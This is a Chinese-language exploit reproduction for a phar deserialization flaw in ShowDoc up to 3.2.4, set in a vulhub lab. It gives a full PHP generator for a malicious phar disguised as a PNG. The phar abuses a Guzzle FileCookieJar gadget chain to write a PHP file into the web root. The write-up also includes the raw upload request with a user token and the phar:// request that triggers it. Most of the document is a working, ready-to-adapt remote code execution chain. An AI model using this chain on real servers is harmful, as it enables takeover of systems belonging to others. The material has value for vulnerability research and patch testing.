## showdoc<=3.2.4 phar反序列漏洞复现

环境：https://github.com/vulhub/vulhub/tree/master/showdoc/3.2.5-sqli

### 生成phar

```php
<?php

namespace GuzzleHttp\Cookie{

    class SetCookie {
        private static $defaults = [
            'Name'     => null,
            'Value'    => null,
            'Domain'   => null,
            'Path'     => '/',
            'Max-Age'  => null,
            'Expires'  => null,
            'Secure'   => false,
            'Discard'  => false,
            'HttpOnly' => false
        ];
        function __construct()
        {
            $this->data['Expires'] = '<?php phpinfo();?>';
            $this->data['Discard'] = 0;
        }
    }

    class CookieJar{
        private $cookies = [];
        private $strictMode;
        function __construct() {
            $this->cookies[] = new SetCookie();
        }
    }

    class FileCookieJar extends CookieJar {
        private $filename;
        private $storeSessionCookies;
        function __construct() {
            parent::__construct();
            $this->filename = "/var/www/html/shell.php";
            $this->storeSessionCookies = true;
        }
    }
}

namespace{
    $pop = new \GuzzleHttp\Cookie\FileCookieJar();
    $phar = new \Phar("y4tacker.phar");
    $phar->startBuffering();
    $phar->setStub('GIF89a'."__HALT_COMPILER();");
    $phar->setMetadata($pop);
    $phar->addFromString("test.txt", "test");
    $phar->stopBuffering();
}
```

### 文件上传

将生成的y4tacker.phar 命名为y4tacker.png，并上传到目标服务器上

user_token 可以使用 [showdoc<=3.2.5 注入漏洞](https://github.com/vulhub/vulhub/tree/master/showdoc/3.2.5-sqli)

![image-20240605084947972](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406071644333.png)

```
POST /server/index.php?s=/api/page/upload HTTP/1.1
Host: 172.17.187.187:4999
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryouyPGbWFA31vLr9M
Referer: http://172.17.187.187:4999/web/
Accept-Language: zh-CN,zh;q=0.9
Origin: http://172.17.187.187:4999
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept: */*
Content-Length: 1383

------WebKitFormBoundaryouyPGbWFA31vLr9M
Content-Disposition: form-data; name="page_id"

191212032
------WebKitFormBoundaryouyPGbWFA31vLr9M
Content-Disposition: form-data; name="item_id"

646578755a
------WebKitFormBoundaryouyPGbWFA31vLr9M
Content-Disposition: form-data; name="user_token"

271e074d6f1a642a9da4dca75579066a77045d9e8846a349465f7ac9717d70f1
------WebKitFormBoundaryouyPGbWFA31vLr9M
Content-Disposition: form-data; name="file"; filename="y4tacker.png"
Content-Type: image/png

{{file(C:\Penetration\TrafficTools\phpStudy\WWW\y4tacker.png)}}
------WebKitFormBoundaryouyPGbWFA31vLr9M--

```

![image-20240607163524529](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406071635754.png)

访问链接获取上传的文件路径

![image-20240607163640002](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406071636054.png)

### 触发phar反序列漏洞

```
GET /server/index.php?s=/home/index/new_is_writeable&file=phar://../Public/Uploads/2024-06-07/6662c593a97fe.png HTTP/1.1
Host:  172.17.187.187:4999
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
```

![image-20240607163847980](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406071638037.png)

![image-20240607163904233](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406071639270.png)

![image-20240607164014016](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406071640065.png)